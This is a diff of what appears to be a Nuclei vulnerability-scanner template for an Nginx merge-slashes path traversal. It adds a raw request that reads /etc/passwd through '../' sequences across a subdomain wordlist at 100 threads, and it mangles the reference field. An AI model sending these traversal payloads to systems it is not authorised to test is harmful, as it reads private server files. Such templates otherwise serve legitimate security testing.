@@ -1,41 +1,44 @@
-id: nginx-merge-slashes-path-traversal
-
+id: nginx-merge-slashes-path-traversal 2
 info:
-  name: Nginx Server - Local File Inclusion
   author: dhiyaneshDk
-  severity: high
-  description: Nginx server is vulnerable to local file inclusion.
-  reference:
-    - https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
+  name: Nginx Merge Slashes Path Traversal
+  reference: '- https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
+
     - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
-    cvss-score: 7.5
-    cwe-id: CWE-22
+
+    '
+  severity: medium
   tags: exposure,config,lfi,nginx
-  metadata:
-    max-request: 3
+requests:
+- attack: sniper
+  matchers:
+  - condition: or
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+    - app.listen
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+  raw:
+  - 'GET /static///////../../../../etc/passwd HTTP/1.1
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}///////../../../etc/passwd"
-      - "{{BaseURL}}/static///////../../../../etc/passwd"
-      - "{{BaseURL}}///../app.js"
+    Host: {{Subdomains}}
 
-    stop-at-first-match: true
-    matchers-condition: and
-    matchers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
+    Firefox/65.0
 
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-          - "app.listen"
-        part: body
-        condition: or
+    Connection: close
 
-      - type: status
-        status:
-          - 200
+    Accept: */*
 
-# Enhanced by mp on 2022/07/27
+    Accept-Language: en
+
+    Accept-Encoding: gzip
+
+    '
+  threads: 100
